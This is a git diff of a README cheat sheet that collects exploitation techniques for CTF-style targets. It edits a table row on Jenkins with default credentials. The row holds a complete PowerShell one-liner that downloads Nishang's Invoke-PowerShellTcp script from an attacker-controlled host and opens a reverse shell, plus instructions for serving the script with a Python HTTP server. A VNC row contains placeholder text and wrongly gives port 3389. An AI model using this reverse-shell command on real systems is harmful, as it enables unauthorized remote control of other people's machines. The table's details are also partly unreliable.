@@ -15,9 +15,10 @@ Here I am collectign some of the random exploits and their exploitation technqiu
 
 Another table
 
-| Application Name | Vulnerability | Scenario | Working Exploits | Reverse Shell | Writeup and Reference |
-| --- | --- | --- | --- | --- | --- |
-| Jenkins  | default username and pass |Running in Windows | [Nishang](https://github.com/samratashok/nishang) to gain initial access. [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/) | Find a feature of the tool that allows you to execute commands on the underlying system. When you find this feature, you can use this command to get the reverse shell on your machine and then run it: powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port|https://executeatwill.com/2020/04/01/TryHackMe-Alfred-Walkthrough/|
+|s.no| Application Name | Vulnerability | Scenario | Working Exploits | Reverse Shell | Writeup and Reference |
+| --- | --- | --- | --- | --- | --- | --- |
+|1.| Jenkins  | default username and pass |Running in Windows | [Nishang](https://github.com/samratashok/nishang) to gain initial access.| Find a feature of the tool that allows you to execute commands on the underlying system. When you find this feature, you can use this command to get the reverse shell on your machine and then run it: <span style="color:blue">powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port.</span> You first need to download the Powershell script, and make it available for the server to download. 
+You can do this by creating a http server with python: python3 -m http.server|https://executeatwill.com/2020/04/01/TryHackMe-Alfred-Walkthrough/  |
 | VNC  | Content Cell  |running in port 3389 and can be exploited using password lookup|
 
 
